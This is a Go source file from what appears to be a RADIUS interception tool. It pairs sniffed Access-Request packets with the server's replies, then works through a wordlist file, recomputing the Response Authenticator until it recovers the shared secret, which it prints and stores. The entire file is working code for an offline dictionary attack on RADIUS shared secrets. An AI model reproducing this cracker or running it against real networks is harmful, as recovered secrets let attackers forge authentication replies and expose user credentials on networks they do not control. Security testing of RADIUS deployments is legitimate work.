package session

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"radius/radius"
)

type packetInfo struct {
	packet radius.RadiusPacket
	addr   net.UDPAddr
}

var cachedPackets []packetInfo

func GuessSecret(packet radius.RadiusPacket, client net.UDPAddr, server net.UDPAddr, clientToServer bool) {

	switch packet.GetCode() {
	case radius.AccessRequest:
		if clientToServer { //Verify that the packet does not come from the RADIUS server

			packetInfo := packetInfo{
				packet: packet,
				addr:   client,
			}

			fmt.Println("Request packet. Auth message:", packet.GetAuthenticator())

			cachedPackets = append(cachedPackets, packetInfo)
		}

	case radius.AccessAccept, radius.AccessChallenge, radius.AccessReject:

		if clientToServer || cachedPackets == nil {
			return //Something went wrong
		}

		for id, packetInfo := range cachedPackets {
			if packetInfo.packet.GetCode() == radius.AccessRequest && packetInfo.packet.GetId() == packet.GetId() &&
				packetInfo.addr.IP.Equal(client.IP) && packetInfo.addr.Port == client.Port { //Match request-response
				request := packetInfo.packet
				cachedPackets = append(cachedPackets[:id], cachedPackets[id+1:]...)

				//At this point, we have pair of packets request-response

				//Change context status
				context := GetContextByClient(client)

				if context != nil && context.GetSecretStatus() == SecretUnknown {
					context.SetSecretStatus(GuessingSecret)
					config := GetConfig()
					go trySecrets(&request, &packet, config.GetSecretsFile(), context)
				}

				break
			}
		}

	}

}

func trySecrets(request *radius.RadiusPacket, response *radius.RadiusPacket, secretFile string, context *ContextInfo) {

	file, err := os.Open(secretFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()

	defer fmt.Println("Secret scanner finished for client ", context.GetClient())

	scanner := bufio.NewScanner(file)

	for scanner.Scan() && context.GetSecretStatus() == GuessingSecret {

		secret := scanner.Text()

		fmt.Println("Trying secret", secret)

		fmt.Println("Response packet. Request Auth message:", request.GetAuthenticator())
		success, respAuth := radius.CalculateResponseAuth(*response, request.GetAuthenticator(), secret)

		if success {
			fmt.Println("Real response auth ", response.GetAuthenticator(), "guessed response auth", respAuth)

			if response.GetAuthenticator() == respAuth {
				fmt.Println("Match!! Secret has been broken!!!", "Secret is ", secret)

				context.SetSecret(secret)
				context.SetSecretStatus(SecretOk)
				return

			}
		}

	}

}
